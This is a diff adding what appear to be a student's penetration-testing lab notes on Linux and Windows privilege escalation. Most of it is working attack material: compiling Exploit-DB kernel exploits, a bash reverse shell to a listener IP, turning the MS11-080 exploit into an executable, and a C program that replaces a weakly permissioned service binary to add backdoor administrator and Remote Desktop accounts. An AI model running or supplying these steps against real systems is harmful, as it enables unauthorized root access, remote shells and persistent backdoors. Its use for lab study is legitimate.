@@ -1,0 +1,84 @@
+############LINUX#####################
+research the target machine on linux
+using uname -a determine the kernel and see if there is a know privilege escalation
+www.exploit-db.com/exploits/18411/
+download in target machine --- notes potential machine ip ends with 240
+compile
+gcc exploit.c -o exploit
+run it done ;D you got root privileges
+read the lab guide for more references video 82
+
+
+sEARCHIVNG FOR SERVICES WITH MISCONFIGURE PERMISSION
+#run this command to find said services aka file with root privileges and read and writable by low priv user
+find / -perm -2 ! -type l -ls 2>/dev/null
+#modify said script to run the following command that establishes a reverse shell to your machine 
+bash -i >& /dev/tcp/192.168.13.220/443 0>&1
+#setup a listener in your machine nc -lvp 443
+nc -lvp 443
+
+sometimes escalation priviliges 
+relies in files that contain password
+group policiy config files
+unatended installation
+or badly wrriten scripts that contain password in it
+
+########################################
+###############WINDOWS#####################
+###########################################
+notes on privilege escalation in windows
+ms011 this bug is classic example user mode to windows kernel with uncheckbuffer overwrite kernel space. 
+gain system level execution windows xp and windows 2003 32bit and 64.
+python exploit
+www.exploit-db.com/exploits/18176/
+install the dependencies needed in the tools directory aka py installer and other file in tools folder
+then copy the exploit to that folder and compile
+
+python pyinstaller.py --onefile ms11-080.py
+create it into an exe in case you dont have python libraries install 
+login to a 2k3
+check to see if you have admin priviliges after executing it by using:
+whoami
+
+create a new windows user
+net user hacker hacker /add
+net localgroup administrators hacker /add #add to administators group
+
+updates reduce 
+
+adminstrative error
+mishandling file and folder user permission allow privilege ecalation 
+windows service 
+doesn't take care file permission full and read and write access to service
+the malicious file executed with system privilege
+
+#lab example
+net user lowpriv mypass /add
+net localgroup "Remote Desktop users" lowpriv /add
+
+check a services.msc
+services.smc
+
+integrity controlist
+icacls on the service exe
+to check if the services is Everyone and Administrators 
+scsiaccess.exe NT AUTHORITY\SYSTEM:(I)(F)
+               BUILTIN\Administrators:(I)(F)
+               BUILTIN\Users:(I)(RX)
+               Everyone:(CI)(F)
+
+abuse this by running c program using the linux crosscompiler
+
+//compilethiscode i586-mingw32msvc-gcc useradd.c -o useradd.exe
+//useradd.c 
+#include <stdlib.h>
+int main()
+{
+	int i;
+	i=system("net localgroup administrators lowpriv /add");
+	i=system("net user hacker hacker /add");
+	i=system("net localgroup administrators hacker /add");
+	i=system("net localgroup \"Remote Desktop users\" hacker /add");
+	return 0;
+}
+
